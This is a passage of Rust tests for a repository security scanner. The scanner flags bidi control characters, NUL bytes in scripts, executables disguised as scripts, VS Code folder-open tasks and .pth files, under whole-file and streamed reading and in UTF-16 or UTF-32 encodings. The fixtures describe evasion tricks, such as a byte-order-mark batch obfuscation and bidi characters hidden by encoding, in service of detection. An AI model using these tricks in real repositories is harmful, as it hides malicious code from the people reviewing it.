        // Feeding in pieces gives the same answer as feeding all at once.
        let data = "h\u{e9}\0llo \u{202e}\0 and more text \n".as_bytes();
        for first in 0..data.len() {
            for second in first..data.len() {
                let mut probe = NulProbe::default();
                probe.feed(&data[..first]);
                probe.feed(&data[first..second]);
                probe.feed(&data[second..]);
                assert!(probe.is_text(), "cuts at {first} and {second}");
            }
        }
    }

    // ---- files read as a stream ---------------------------------------------

    /// Every file of more than one byte is read as a stream.
    fn streaming() -> Limits {
        Limits {
            max_buffered_size: 1,
            ..Limits::default()
        }
    }

    #[test]
    fn a_streamed_file_gets_the_same_result_as_one_read_whole() {
        let dir = tempfile::tempdir().unwrap();
        let comments = "# a comment line\n".repeat(600);
        let files: [(&str, Vec<u8>); 9] = [
            (
                "plain.txt",
                b"one\r\ntwo\nTODO\r\nTODO\n\nlast TODO".to_vec(),
            ),
            ("lib/env", payload_with(b"", b"# \0\xFF\n")),
            ("late-nul", payload_with(comments.as_bytes(), b"# \0\xFF\n")),
            ("padded", payload_with(b"", &[0; 4096])),
            ("gif", payload_with(b"GIF89a=1\n", b"\0\n")),
            ("icon.icns", noise_with_bidi(b"icns\0\0\x10\0")),
            (
                "run.sh",
                format!("#!/bin/sh\n# a\0b\necho {BIDI}\n").into_bytes(),
            ),
            (
                "notes",
                b"some notes x \xE2\0\x80\xAE y and more text\n".to_vec(),
            ),
            ("todos.txt", "TODO\n".repeat(130).into_bytes()),
        ];
        for (name, contents) in &files {
            write(dir.path(), name, contents);
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        rules.extend(parse_rules(RULES, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        assert!(!whole.findings.is_empty());
        assert_eq!(whole.findings, streamed.findings);
        assert_eq!(whole.unlisted, streamed.unlisted);
        assert_eq!(whole.skipped, streamed.skipped);
        assert_eq!(whole.files_scanned, streamed.files_scanned);
    }

    #[test]
    fn a_large_text_file_is_scanned_and_the_scan_stays_complete() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = "x = 1\n".repeat(2000).into_bytes();
        contents.extend_from_slice(PAYLOAD);
        write(dir.path(), "fixture.ts", &contents);
        let mut rules = Vec::new();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        let limits = Limits {
            max_buffered_size: 1024,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.findings[0].line, 2001);
        assert!(report.skipped.is_empty());
        assert!(report.is_complete());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn a_streamed_executable_is_listed_and_a_streamed_binary_is_ascii_only() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool.exe", &noise_with_bidi(b"MZ\x90\0"));
        write(dir.path(), "voice.mp3", &noise_with_bidi(b"ID3\x03\0\0\0"));
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, streaming());

        // The streamed executable gets its head rules: a finding, and listed.
        let found: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.rule_id.as_str()))
            .collect();
        assert_eq!(found, [("tool.exe".to_string(), "repo.committed-binary")]);
        let mut reasons: Vec<_> = report
            .skipped
            .iter()
            .map(|s| (to_slash(&s.path), s.reason.clone()))
            .collect();
        reasons.sort_by(|a, b| a.0.cmp(&b.0));
        assert_eq!(
            reasons,
            [
                (
                    "tool.exe".to_string(),
                    SkipReason::Executable {
                        format: "PE",
                        reported: true,
                    }
                ),
                ("voice.mp3".to_string(), SkipReason::Binary),
            ]
        );
        assert!(report.is_complete());
    }

    #[test]
    fn a_streamed_file_that_a_whole_file_rule_selects_is_still_listed_as_too_large() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "big.pth", &[b'#'; 100]);
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, streaming());

        let found = explanations(&report);
        assert_eq!(found.len(), 1, "the rule runs once");
        assert!(found[0].1.contains("issue=Some(TooLarge { size: 100 })"));
        assert!(matches!(
            report.skipped[..],
            [Skipped {
                reason: SkipReason::TooLarge { size: 100 },
                ..
            }]
        ));
        assert!(!report.is_complete());
    }

    #[test]
    fn a_streamed_executable_still_lets_a_rule_that_selects_it_by_name_run() {
        let dir = tempfile::tempdir().unwrap();
        let mut bytes = b"MZ\x90\0\nimport os\n".to_vec();
        bytes.extend_from_slice(&[b'#'; 100]);
        write(dir.path(), "x.pth", &bytes);
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, streaming());

        let found = explanations(&report);
        assert_eq!(found.len(), 1, "the rule runs once");
        assert!(found[0].1.contains("issue=Some(TooLarge"), "{}", found[0].1);
        let kinds: Vec<_> = report.skipped.iter().map(|s| s.reason.clone()).collect();
        assert!(kinds.contains(&SkipReason::Executable {
            format: "PE",
            reported: false,
        }));
        assert!(!report.is_complete());
    }

    #[test]
    fn chunk_edges_do_not_change_what_a_streamed_file_means() {
        // Things that straddle the 64 KiB read size of the first pass.
        let edge = 64 * 1024;
        let mut files: Vec<(String, Vec<u8>)> = Vec::new();
        for shift in [2usize, 1, 0] {
            // A NUL, then a cut bidi character, then a payload line.
            let mut bytes = vec![b'a'; edge - shift];
            bytes.extend_from_slice(b"\n");
            bytes.extend_from_slice(b"x \xE2\0\x80\xAE y\n");
            bytes.extend_from_slice(PAYLOAD);
            bytes.extend_from_slice(b"# \0\n");
            files.push((format!("edge-{shift}"), bytes));
            let mut script = b"#!/bin/sh\n".to_vec();
            script.extend(vec![b'#'; edge - shift - script.len()]);
            script.extend_from_slice(b"\0\r\n");
            script.extend_from_slice(PAYLOAD);
            files.push((format!("edge-{shift}.sh"), script));
        }
        let dir = tempfile::tempdir().unwrap();
        for (name, bytes) in &files {
            write(dir.path(), name, bytes);
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        assert!(whole.findings.len() >= 12, "{:?}", whole.findings);
        assert_eq!(whole.findings, streamed.findings);
        assert_eq!(whole.skipped, streamed.skipped);
    }

    #[test]
    fn a_file_of_exactly_the_buffer_size_is_read_whole_and_one_byte_more_is_streamed() {
        let dir = tempfile::tempdir().unwrap();
        let limits = Limits {
            max_buffered_size: 100,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];
        write(dir.path(), "whole.pth", &[b'#'; 100]);
        write(dir.path(), "streamed.pth", &[b'#'; 101]);

        let report = scan(dir.path(), &rules, limits);

        let found = explanations(&report);
        let of = |name: &str| {
            found
                .iter()
                .find(|(file, _)| file == name)
                .unwrap()
                .1
                .clone()
        };
        assert!(of("whole.pth").contains("bytes=100 issue=None"));
        assert!(of("streamed.pth").contains("TooLarge"));
    }

    #[test]
    fn a_crlf_line_of_exactly_the_limit_is_not_too_long() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = vec![b'x'; 50];
        contents.extend_from_slice(b"\r\nTODO\n");
        write(dir.path(), "a.txt", &contents);
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_buffered_size: 10,
            max_line_size: 50,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1);
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_line_longer_than_the_limit_makes_the_scan_inconclusive() {
        let dir = tempfile::tempdir().unwrap();
        let mut contents = b"short\nTODO\n".to_vec();
        contents.extend_from_slice(&[b'x'; 200]);
        contents.extend_from_slice(b"\nTODO\n");
        write(dir.path(), "min.js", &contents);
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_buffered_size: 10,
            max_line_size: 100,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert_eq!(report.findings.len(), 1, "the line before it was scanned");
        assert!(matches!(
            report.skipped[..],
            [Skipped {
                reason: SkipReason::LineTooLong { line: 3 },
                ..
            }]
        ));
        assert!(!report.is_complete());
    }

    /// UTF-16 with a byte order mark, as Windows PowerShell writes it.
    fn utf16(text: &str, little_endian: bool) -> Vec<u8> {
        let mut bytes = if little_endian {
            vec![0xFF, 0xFE]
        } else {
            vec![0xFE, 0xFF]
        };
        for unit in text.encode_utf16() {
            bytes.extend(if little_endian {
                unit.to_le_bytes()
            } else {
                unit.to_be_bytes()
            });
        }
        bytes
    }

    /// #64: text made only of characters whose two UTF-16 bytes are both
    /// non-zero has no NUL byte, and such a script was read as lossy UTF-8.
    #[test]
    fn a_utf16_script_without_a_nul_byte_up_front_is_still_decoded() {
        let padding = "\u{101}".repeat(5000) + "\n";
        // 0x01 0x01 is U+0101 either way, and U+202E is 0x2E 0x20: one line,
        // no NUL byte anywhere in the file.
        let no_nul_at_all = utf16(&format!("{}\u{202E}\u{101}", "\u{101}".repeat(5000)), true);
        assert!(!no_nul_at_all.contains(&0));
        let late_nul = utf16(&format!("{padding}# \u{202E}evil\n"), true);
        assert!(!looks_binary(&late_nul) && late_nul.contains(&0));
        let big_endian = utf16(&format!("{padding}' \u{202E}evil\n"), false);
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "no-nul.ps1", &no_nul_at_all);
        write(dir.path(), "late-nul.psm1", &late_nul);
        write(dir.path(), "big-endian.vbs", &big_endian);
        // Not a script extension: still read as before, without decoding.
        write(dir.path(), "notes.txt", &no_nul_at_all);
        let rules = builtin_rules().unwrap();

        for limits in [Limits::default(), streaming()] {
            let report = scan(dir.path(), &rules, limits);

            let bidi: Vec<_> = report
                .findings
                .iter()
                .filter(|f| f.rule_id == "deception.bidi-control")
                .map(|f| (to_slash(&f.file), f.line, f.column))
                .collect();
            assert_eq!(
                bidi,
                [
                    ("big-endian.vbs".to_string(), 2, Some(3)),
                    ("late-nul.psm1".to_string(), 2, Some(3)),
                    ("no-nul.ps1".to_string(), 1, Some(5001)),
                ],
                "{limits:?}"
            );
            assert!(report.is_complete(), "{limits:?}: {:?}", report.skipped);
        }
    }

    #[test]
    fn a_streamed_utf16_script_gets_the_same_result_as_one_read_whole() {
        let dir = tempfile::tempdir().unwrap();
        let mut odd = utf16("# a\r\n# \u{202E}x\r\nTODO", true);
        odd.push(0x41);
        let mut lone_high = utf16("# \u{202E}\n", true);
        lone_high.extend([0x00, 0xD8, 0x41, 0x00]);
        let mut trailing_high = utf16("TODO\r", false);
        trailing_high.extend([0xD8, 0x00]);
        let files: [(&str, Vec<u8>); 6] = [
            (
                "crlf.ps1",
                utf16("# one\r\n\r\n# \u{202E}two\r\nTODO\r\n", true),
            ),
            ("be.vbs", utf16("' \u{1F600} \u{202E}\nTODO\n\n", false)),
            ("odd.ps1", odd),
            ("lone-high.ps1", lone_high),
            ("trailing-high.ps1", trailing_high),
            ("empty.ps1", vec![0xFF, 0xFE]),
        ];
        for (name, contents) in &files {
            write(dir.path(), name, contents);
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(RULES, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        assert!(whole.findings.len() >= 6, "{:?}", whole.findings);
        assert_eq!(whole.findings, streamed.findings);
        assert_eq!(whole.skipped, streamed.skipped);
        assert_eq!(whole.files_scanned, streamed.files_scanned);
    }

    /// tsc, Perl and the script hosts decode a UTF-16 byte order mark, and
    /// Python, Ruby and Node cannot run such a file, so it is decoded: the
    /// bidi character is found and the NUL bytes of UTF-16 are not reported.
    #[test]
    fn a_utf16_script_of_any_decoding_host_is_decoded() {
        let dir = tempfile::tempdir().unwrap();
        let text = "// a\n// \u{202E} evil\n";
        write(dir.path(), "src.ts", &utf16(text, true));
        write(dir.path(), "app.tsx", &utf16(text, true));
        write(dir.path(), "lib.mjs", &utf16(text, false));
        write(
            dir.path(),
            "tool.py",
            &utf16("# a\n# \u{202E} evil\n", true),
        );
        write(
            dir.path(),
            "Run.PS1",
            &utf16("# a\n# \u{202E} evil\n", true),
        );
        // A big-endian mark on a batch file: still read as bytes.
        let mut batch = vec![0xFE, 0xFF];
        batch.extend_from_slice("&cls\r\nrem \u{202E} evil\r\n".as_bytes());
        write(dir.path(), "run.bat", &batch);
        let rules = builtin_rules().unwrap();

        for limits in [Limits::default(), streaming()] {
            let report = scan(dir.path(), &rules, limits);

            assert_eq!(
                builtin_findings(&report, "deception.bidi-control"),
                [
                    ("Run.PS1".to_string(), 2),
                    ("app.tsx".to_string(), 2),
                    ("lib.mjs".to_string(), 2),
                    ("run.bat".to_string(), 2),
                    ("src.ts".to_string(), 2),
                    ("tool.py".to_string(), 2),
                ],
                "{limits:?}"
            );
            assert!(builtin_findings(&report, NUL_RULE).is_empty(), "{limits:?}");
        }
    }

    /// `cmd.exe`, the shells and PHP ignore a UTF-16 byte order mark and run
    /// the bytes; decoding such a file as UTF-16 would hide the payload in
    /// garbage (a known batch obfuscation, `FF FE 26 63 6C 73 0D 0A`).
    #[test]
    fn a_byte_order_mark_on_a_script_whose_host_reads_bytes_is_not_decoded() {
        let with_mark = |text: &str| {
            let mut bytes = vec![0xFF, 0xFE];
            bytes.extend_from_slice(text.as_bytes());
            bytes
        };
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "run.bat",
            &with_mark("&cls\r\nrem \u{202E} evil\r\n"),
        );
        write(
            dir.path(),
            "install.sh",
            &with_mark("\nX=1 # \u{202E} evil\n"),
        );
        write(
            dir.path(),
            "index.php",
            &with_mark("<?php // \u{202E} ?>\n"),
        );
        // Read as bytes, so the NUL rule still applies.
        write(dir.path(), "nul.cmd", &with_mark("echo a\r\nrem \0\r\n"));
        // Honest text in such a file: no bidi character appears by chance.
        write(dir.path(), "notes.sh", &with_mark("a. b. c. f g h i. \n"));
        let rules = builtin_rules().unwrap();

        for limits in [Limits::default(), streaming()] {
            let report = scan(dir.path(), &rules, limits);

            let bidi: Vec<_> = report
                .findings
                .iter()
                .filter(|f| f.rule_id == "deception.bidi-control")
                .map(|f| (to_slash(&f.file), f.line))
                .collect();
            assert_eq!(
                bidi,
                [
                    ("index.php".to_string(), 1),
                    ("install.sh".to_string(), 2),
                    ("run.bat".to_string(), 2),
                ],
                "{limits:?}"
            );
            assert_eq!(
                builtin_findings(&report, NUL_RULE),
                [("nul.cmd".to_string(), 2)],
                "{limits:?}"
            );
        }
    }

    /// PowerShell reads UTF-32 LE (`FF FE 00 00`). Decoded as UTF-16 it has a
    /// U+0000 after every character, which is dropped, so its text is read.
    #[test]
    fn a_utf32_script_is_not_hidden_behind_u0000() {
        let mut bytes = vec![0xFF, 0xFE, 0x00, 0x00];
        for c in "# a\n# \u{202E}evil\nTODO\n".chars() {
            bytes.extend((c as u32).to_le_bytes());
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "wide.ps1", &bytes);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(RULES, "test.toml").unwrap());

        let whole = scan(dir.path(), &rules, Limits::default());
        let streamed = scan(dir.path(), &rules, streaming());

        let found: Vec<_> = whole
            .findings
            .iter()
            .filter(|f| f.rule_id != "repo.windows-script")
            .map(|f| (f.rule_id.as_str(), f.line))
            .collect();
        assert_eq!(
            found,
            [("deception.bidi-control", 2), ("test.everywhere", 3)]
        );
        assert_eq!(whole.findings, streamed.findings);
    }

    /// The streamed decoder against the whole-file one on random code units,
    /// read a few bytes at a time, so surrogate pairs, odd bytes and `\r\n`
    /// are cut by read boundaries.
    #[test]
    fn the_streamed_utf16_decoder_matches_the_whole_file_on_any_read_boundaries() {
        struct Trickle<'a> {
            bytes: &'a [u8],
            step: usize,
            calls: usize,
        }
        impl Read for Trickle<'_> {
            fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
                self.calls += 1;
                let n = (1 + (self.calls * 7 + self.step) % 5)
                    .min(buf.len())
                    .min(self.bytes.len());
                buf[..n].copy_from_slice(&self.bytes[..n]);
                self.bytes = &self.bytes[n..];
                Ok(n)
            }
        }
        // A small linear congruential generator: deterministic, no crate.
        let mut state: u64 = 0x2545_F491_4F6C_DD1D;
        let mut next = move || {
            state = state
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1);
            (state >> 33) as u32
        };
        let alphabet: [u16; 10] = [
            0x41, 0x0A, 0x0D, 0x00, 0xD800, 0xDC00, 0xDBFF, 0x202E, 0xFFFD, 0x0101,
        ];
        for case in 0..2000 {
            let little_endian = case % 2 == 0;
            let mut bytes = if little_endian {
                vec![0xFF, 0xFE]
            } else {
                vec![0xFE, 0xFF]
            };
            for _ in 0..(next() % 40) {
                let unit = alphabet[(next() % 10) as usize];
                bytes.extend(if little_endian {
                    unit.to_le_bytes()
                } else {
                    unit.to_be_bytes()
                });
            }
            if next() % 3 == 0 {
                bytes.push(0x41);
            }
            let expected: Vec<String> = decode_utf16_bom(&bytes)
                .lines()
                .map(str::to_string)
                .collect();

            let mut got = Vec::new();
            let mut decoder = Utf16Lines::new(usize::MAX / 2);
            let reader = Trickle {
                bytes: &bytes,
                step: case,
                calls: 0,
            };
            let result = stream_utf16(reader, &mut decoder, |number, text| {
                assert_eq!(number, got.len() + 1);
                got.push(text.to_string());
            });
            assert_eq!(result.unwrap(), None);
            assert_eq!(got, expected, "case {case}: {bytes:02X?}");
        }
    }

    #[test]
    fn a_streamed_utf16_crlf_line_of_exactly_the_limit_is_not_too_long() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "edge.ps1",
            &utf16(&format!("{}\r\n# \u{202E}\r\n", "a".repeat(64)), true),
        );
        let limits = Limits {
            max_buffered_size: 1,
            max_line_size: 64,
            ..Limits::default()
        };

        let report = scan(dir.path(), &builtin_rules().unwrap(), limits);

        assert!(report.skipped.is_empty(), "{:?}", report.skipped);
        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("edge.ps1".to_string(), 2)]
        );
    }

    #[test]
    fn a_streamed_utf16_line_over_the_limit_makes_the_scan_inconclusive() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "long.ps1",
            &utf16(
                &format!("# ok\n{}\n# \u{202E}\n", "\u{101}".repeat(40)),
                true,
            ),
        );
        let limits = Limits {
            max_buffered_size: 1,
            max_line_size: 64,
            ..Limits::default()
        };

        let report = scan(dir.path(), &builtin_rules().unwrap(), limits);

        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("long.ps1"),
                reason: SkipReason::LineTooLong { line: 2 },
            }]
        );
        assert!(!report.is_complete());
    }

    #[test]
    fn an_elf_named_like_a_script_is_an_executable_not_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool.sh", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        // Reported as an executable disguised as a script, not as a script.
        assert_eq!(report.inconclusive_count(), 0);
        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert_eq!(
            builtin_findings(&report, "repo.disguised-executable").len(),
            1
        );
        assert_eq!(
            report.skipped[0].reason,
            SkipReason::Executable {
                format: "ELF",
                reported: true
            }
        );
    }

    #[test]
    fn script_detection_and_nul_line_helpers() {
        assert!(is_script("a/b/run.sh", b""));
        assert!(is_script("a/RUN.PS1", b""));
        assert!(is_script("tool", b"#!/usr/bin/env node\n"));
        assert!(!is_script("a.txt", b"hello"));
        assert!(!is_script("archive.sh.zip", b"PK"));
        assert!(!is_script("x.ps1", &[0xFF, 0xFE, b'a', 0]));
        assert!(has_script_extension("x.ps1"));
        assert_eq!(decode_utf16_bom(&[0xFF, 0xFE, b'a', 0, b'b', 0]), "ab");
        assert_eq!(decode_utf16_bom(&[0xFE, 0xFF, 0, b'a', 0xD8]), "a\u{FFFD}");
        assert!(!is_script("noext", b"plain"));

        assert_eq!(first_nul_line(b"a\nb\0c"), Some(2));
        assert_eq!(first_nul_line(b"a\r\nb\r\n\0"), Some(3));
        assert_eq!(first_nul_line(b"no nul"), None);
    }

    /// `(line, column, span, snippet)` of a finding.
    type Located = (usize, Option<usize>, Option<Range<usize>>, Option<String>);

    fn locations(report: &Report, rule_id: &str) -> Vec<Located> {
        report
            .findings
            .iter()
            .filter(|f| f.rule_id == rule_id)
            .map(|f| (f.line, f.column, f.span.clone(), f.snippet.clone()))
            .collect()
    }

    fn scan_one_with(name: &str, contents: &[u8], limits: Limits) -> Report {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), name, contents);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(RULES, "test.toml").unwrap());
        scan(dir.path(), &rules, limits)
    }

    fn scan_one(name: &str, contents: &[u8]) -> Report {
        scan_one_with(name, contents, Limits::default())
    }

    fn some(text: &str) -> Option<String> {
        Some(text.to_string())
    }

    #[test]
    fn line_findings_have_column_span_and_snippet_with_lf_and_crlf() {
        for (contents, line_start) in [
            (&b"ab\nx  TODO y\n"[..], 3),
            (&b"ab\r\nx  TODO y\r\n"[..], 4),
        ] {
            let report = scan_one("a.txt", contents);
            let span = line_start + 3..line_start + 7;
            assert_eq!(
                locations(&report, "test.everywhere"),
                [(2, Some(4), Some(span.clone()), some("x  TODO y"))]
            );
            assert_eq!(&contents[span], b"TODO");
        }
    }

    #[test]
    fn columns_count_characters_and_skip_a_byte_order_mark() {
        let contents = "\u{feff}TODO\r\n\u{e9}\u{1F600} TODO\r\nlast TODO".as_bytes();
        let report = scan_one("a.txt", contents);
        let found = locations(&report, "test.everywhere");
        assert_eq!(
            found,
            [
                (1, Some(1), Some(3..7), some("TODO")),
                (2, Some(4), Some(16..20), some("\u{e9}\u{1F600} TODO")),
                (3, Some(6), Some(27..31), some("last TODO")),
            ]
        );
        for (_, _, span, _) in found {
            assert_eq!(&contents[span.unwrap()], b"TODO");
        }
    }

    #[test]
    fn no_span_or_column_when_the_text_is_not_the_file_byte_for_byte() {
        // A NUL in a script: the line rules read it with the NUL dropped, so
        // their offsets are not the file's; the NUL's own offset is exact.
        let report = scan_one("run.sh", b"a\n#\0x\nTODO\n");
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(3, None, None, some("TODO"))]
        );
        assert_eq!(
            locations(&report, "deception.nul-byte-in-script"),
            [(2, None, Some(3..4), None)]
        );

        // Invalid UTF-8 is replaced, which changes the byte length.
        let report = scan_one("a.txt", b"\xFF TODO");
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(1, None, None, some("\u{FFFD} TODO"))]
        );

        // Binary-looking data is read as ASCII only.
        let report = scan_one("blob.bin", b"\x1f\x8b\0\0 TODO");
        let found = locations(&report, "test.everywhere");
        assert_eq!((found[0].1, found[0].2.clone()), (None, None));

        // UTF-16 is decoded: the column is in the decoded line, there is no span.
        let mut utf16 = vec![0xFF, 0xFE];
        for unit in "x \u{202E} TODO".encode_utf16() {
            utf16.extend(unit.to_le_bytes());
        }
        let report = scan_one("run.ps1", &utf16);
        assert_eq!(
            locations(&report, "deception.bidi-control"),
            [(1, Some(3), None, some("x \\u{202E} TODO"))]
        );
        assert_eq!(locations(&report, "test.everywhere")[0].1, Some(5));
    }

    #[test]
    fn a_streamed_file_has_exact_spans_only_when_it_is_its_own_text() {
        let streamed = Limits {
            max_buffered_size: 1,
            ..Limits::default()
        };
        let contents = b"one\r\ntwo\r\nx TODO\r\n";
        let report = scan_one_with("a.txt", contents, streamed);
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(3, Some(3), Some(12..16), some("x TODO"))]
        );
        assert_eq!(&contents[12..16], b"TODO");

        // One invalid byte anywhere and no line has a span, as when read whole.
        let report = scan_one_with("b.txt", b"\xFF\r\nx TODO\r\n", streamed);
        assert_eq!(
            locations(&report, "test.everywhere"),
            [(2, None, None, some("x TODO"))]
        );
    }

    #[test]
    fn snippets_keep_the_match_in_view_on_long_lines() {
        let line = format!("{}TODO{}", "a".repeat(500), "b".repeat(500));
        let report = scan_one("a.txt", line.as_bytes());
        let found = locations(&report, "test.everywhere");
        assert_eq!(found[0].1, Some(501));
        let expected = format!("...{}TODO{}...", "a".repeat(40), "b".repeat(76));
        assert_eq!(found[0].3.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn hostile_snippets_are_escaped_capped_and_still_show_the_match() {
        let mut line = String::from("\t\u{1b}[2J\u{9b}\u{2028}\u{E0041}");
        line.push_str(&"\u{202E}".repeat(10_000));
        line.push_str("TODO\tx \r\n");
        let report = scan_one("a.txt", line.as_bytes());

        let todo = locations(&report, "test.everywhere")[0].3.clone().unwrap();
        assert_eq!(todo, format!("...{}TODO x", "\\u{202E}".repeat(5)));

        let bidi = locations(&report, "deception.bidi-control")[0]
            .3
            .clone()
            .unwrap();
        let start = "\\u{001B}[2J\\u{009B}\\u{2028}\\u{E0041}";
        assert!(bidi.starts_with(start), "{bidi}");
        assert!(bidi.ends_with("..."), "{bidi}");
        assert!(bidi.chars().count() <= MAX_SNIPPET_CHARS + 16, "{bidi}");
        for snippet in [&todo, &bidi] {
            assert!(
                snippet
                    .chars()
                    .all(|c| c.is_ascii() && !c.is_ascii_control()),
                "{snippet:?}"
            );
        }
    }

    #[test]
    fn jsonc_findings_point_at_the_value_even_after_a_byte_order_mark() {
        let text = "{\r\n  // c\r\n  \"tasks\": [{\"label\": \"x\",\r\n    \"runOptions\": {\"runOn\": \"folderOpen\"}}]\r\n}\r\n";
        let mut spans = Vec::new();
        for prefix in ["", "\u{feff}"] {
            let contents = format!("{prefix}{text}");
            let report = scan_one(".vscode/tasks.json", contents.as_bytes());
            let found = locations(&report, "ide.vscode-folder-open-task");
            assert_eq!(found.len(), 1);
            let (line, column, span, snippet) = found[0].clone();
            assert_eq!((line, column), (4, Some(29)));
            assert_eq!(
                snippet.as_deref(),
                Some(r#""runOptions": {"runOn": "folderOpen"}}]"#)
            );
            let span = span.unwrap();
            assert_eq!(&contents.as_bytes()[span.clone()], b"\"folderOpen\"");
            spans.push(span.start);
        }
        assert_eq!(
            spans[1],
            spans[0] + 3,
            "the byte order mark is part of the file"
        );
    }

    #[test]
    fn a_binary_looking_tasks_file_keeps_its_note_and_gets_no_span() {
        let contents =
            b"{/* \0\0\0\0\0\0\0\0\0\0\xFF */ \"tasks\": [{\"runOptions\": {\"runOn\": \"folderOpen\"}}]}";
        let report = scan_one(".vscode/tasks.json", contents);
        let finding = report
            .findings
            .iter()
            .find(|f| f.rule_id == "ide.vscode-folder-open-task")
            .unwrap();
        assert_eq!((finding.column, &finding.span), (None, &None));
        assert!(finding.snippet.is_some());
        assert!(finding.explanation.ends_with(BINARY_LOOKING_NOTE));
    }

    #[test]
    fn spans_from_a_check_are_validated_and_located_hits_are_capped() {
        fn many(ctx: &Ctx<'_>) -> Vec<Hit> {
            let hit = |line, span| Hit {
                line,
                span: Some(TextSpan(span)),
                severity: ctx.base,
                reason: "bad".to_string(),
            };
            // Reversed, past the end, inside a character, at the very end of
            // the address space, and on another line than the one named.
            let mut hits = vec![
                hit(1, Range { start: 3, end: 1 }),
                hit(1, 0..100_000),
                hit(1, 300..301),
                hit(1, usize::MAX..usize::MAX),
                hit(2, 0..1),
            ];
            for index in 0..150 {
                let mut good = hit(1, index..index + 1);
                good.reason = "good".to_string();
                hits.push(good);
            }
            hits
        }
        let dir = tempfile::tempdir().unwrap();
        let mut text = "x".repeat(300);
        text.push('\u{e9}');
        write(dir.path(), "a.json", text.as_bytes());
        let mut rule = file_rule("**/*.json", many);
        rule.matcher = Matcher::Jsonc(many);

        let report = scan(dir.path(), &[rule], Limits::default());

        assert_eq!(report.findings.len(), 155, "locating never drops a finding");
        for finding in report.findings.iter().filter(|f| f.explanation == "bad") {
            assert_eq!((finding.column, &finding.span), (None, &None));
            assert_eq!(finding.snippet, None);
        }
        let located = report
            .findings
            .iter()
            .filter(|f| f.column.is_some())
            .count();
        assert_eq!(located, MAX_LOCATED_HITS - 5);
    }

    #[cfg(unix)]
    #[test]
    fn an_entry_whose_bytes_are_not_its_own_gets_no_location() {
        fn spanned(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: Some(TextSpan(0..6)),
                severity: ctx.base,
                reason: format!("bytes={}", ctx.bytes().len()),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "real.txt", b"import os\n");
        std::os::unix::fs::symlink("real.txt", dir.path().join("evil.pth")).unwrap();
        let rules = [file_rule("**/*.pth", spanned)];

        let report = scan(dir.path(), &rules, Limits::default());

        let finding = &report.findings[0];
        assert_eq!(finding.explanation, "bytes=10", "the check saw the target");
        assert_eq!(
            (finding.column, &finding.span, &finding.snippet),
            (None, &None, &None)
        );
    }

    #[test]
    fn location_helpers_never_panic_on_odd_input() {
        assert_eq!(Location::in_text("", &(0..0), true, true).column, Some(1));
        assert_eq!(Location::in_text("ab", &(2..2), true, true).column, Some(3));
        assert_eq!(
            Location::in_text("a\r\n", &(1..2), true, true).column,
            Some(2)
        );
        let past = Location::in_line("ab", 9, false, true, Some(0..1));
        assert_eq!((past.column, past.span), (Some(3), Some(0..1)));
        assert_eq!(snippet("", 0), "");
        assert_eq!(snippet("   ", 1), "");
        assert_eq!(
            snippet("\u{e9}", 1),
            "",
            "inside a character: nothing, no panic"
        );
        assert_eq!(snippet("\u{e9}x", 2), "\u{e9}x");
        assert_eq!(nul_span(b"ab"), None);
        assert_eq!(nul_span(b"a\0"), Some(1..2));
    }

    fn head_rule(check: Check) -> Rule {
        let mut rule = file_rule("**", check);
        rule.id = "test.head".to_string();
        rule.matcher = Matcher::Head(check);
        rule.files = None;
        rule
    }

    #[test]
    fn head_rules_see_every_entry_once_and_never_make_a_file_too_large() {
